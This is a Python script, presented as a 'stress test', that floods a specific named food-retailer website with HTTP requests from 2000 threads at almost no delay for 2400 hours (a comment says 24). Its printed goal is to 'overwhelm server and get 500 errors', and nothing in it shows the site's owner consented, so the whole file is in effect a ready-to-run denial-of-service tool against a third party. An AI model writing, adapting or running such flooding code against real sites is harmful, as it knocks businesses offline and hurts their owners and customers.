import requests
import threading
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import random

# URL of the website you want to send traffic to
url = 'https://www.amishfinefood.com/'

# Duration in hours (24 hours)
duration_hours = 2400

# MAXIMUM SERVER STRESS SETTINGS - MORE AGGRESSIVE
max_workers = 2000  # Even more threads
timeout = 1  # Very short timeout
request_interval = 0.0001  # Almost no delay

# Define the headers with a User-Agent
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Connection': 'keep-alive'
}

# Create a session for connection pooling
session = requests.Session()
session.headers.update(headers)

# Statistics tracking
stats = {
    'successful_requests': 0,
    'failed_requests': 0,
    'total_requests': 0,
    'status_codes': {},
    'server_errors': 0
}

# Thread-safe counter
request_counter = 0
counter_lock = threading.Lock()

def send_request():
    """Send a single request to stress test server"""
    global request_counter
    
    try:
        response = session.get(url, timeout=timeout)
        
        with counter_lock:
            stats['total_requests'] += 1
            request_counter = stats['total_requests']
            
            # Track status codes
            status_code = response.status_code
            stats['status_codes'][status_code] = stats['status_codes'].get(status_code, 0) + 1
            
            # Track server errors (500+)
            if status_code >= 500:
                stats['server_errors'] += 1
        
        if response.status_code == 200:
            stats['successful_requests'] += 1
            print(f"✓ Request {request_counter}: Success (200)")
        elif response.status_code >= 500:
            stats['failed_requests'] += 1
            print(f"🔥 Request {request_counter}: Server Error {response.status_code} - STRESSING SERVER!")
        else:
            stats['failed_requests'] += 1
            print(f"✗ Request {request_counter}: Status {response.status_code}")
            
    except Exception as e:
        with counter_lock:
            stats['total_requests'] += 1
            request_counter = stats['total_requests']
            stats['failed_requests'] += 1
        print(f"✗ Request {request_counter}: Exception {str(e)[:30]}...")

def print_stats():
    """Print statistics focused on server stress"""
    success_rate = (stats['successful_requests'] / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
    server_error_rate = (stats['server_errors'] / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
    elapsed_time = time.time() - start_time
    requests_per_second = stats['total_requests'] / elapsed_time if elapsed_time > 0 else 0
    
    print(f"\n🔥 AGGRESSIVE SERVER STRESS TEST - Elapsed: {elapsed_time:.0f}s")
    print(f"   Total Requests: {stats['total_requests']}")
    print(f"   ✅ Successful (200): {stats['successful_requests']}")
    print(f"   🔥 Server Errors (500+): {stats['server_errors']}")
    print(f"   ❌ Failed: {stats['failed_requests']}")
    print(f"   🎯 Success Rate: {success_rate:.1f}%")
    print(f"   🔥 Server Error Rate: {server_error_rate:.1f}%")
    print(f"   ⚡ Requests/sec: {requests_per_second:.1f}")
    
    # Show status code breakdown
    print(f"   📈 Status Code Breakdown:")
    for code, count in sorted(stats['status_codes'].items()):
        if code >= 500:
            print(f"     🔥 {code}: {count} (SERVER STRESSED!)")
        elif code == 200:
            print(f"     ✅ {code}: {count} (SUCCESS)")
        else:
            print(f"     ❌ {code}: {count}")
    print("-" * 60)

def simulate_traffic():
    """Simulate traffic to stress test server to maximum"""
    global start_time
    start_time = time.time()
    end_time = start_time + (duration_hours * 3600)
    
    print(f"🔥 Starting AGGRESSIVE SERVER STRESS TEST for {duration_hours} hours")
    print(f"⏰ Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"⏰ End time: {datetime.fromtimestamp(end_time).strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"🔧 Using {max_workers} threads - MAXIMUM AGGRESSION")
    print(f"🔥 Goal: Overwhelm server and get 500 errors")
    print(f"⚡ This will be much more aggressive!")
    print("-" * 60)
    
    # Use ThreadPoolExecutor for maximum efficiency
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        last_stats_time = start_time
        
        # Submit requests continuously at MAXIMUM STRESS
        while time.time() < end_time:
            # Submit as many requests as possible
            for _ in range(max_workers):
                if time.time() >= end_time:
                    break
                executor.submit(send_request)
            
            # Print stats every 10 seconds
            current_time = time.time()
            if current_time - last_stats_time >= 10:
                print_stats()
                last_stats_time = current_time
            
            # Minimal delay to prevent system overload
            time.sleep(request_interval)
    
    # Final statistics
    print("\n🏁 Server stress test completed!")
    print_stats()
    
    # Close the session
    session.close()

if __name__ == "__main__":
    try:
        simulate_traffic()
    except KeyboardInterrupt:
        print("\n⏹️  Server stress test stopped by user")
        print_stats()
        session.close()
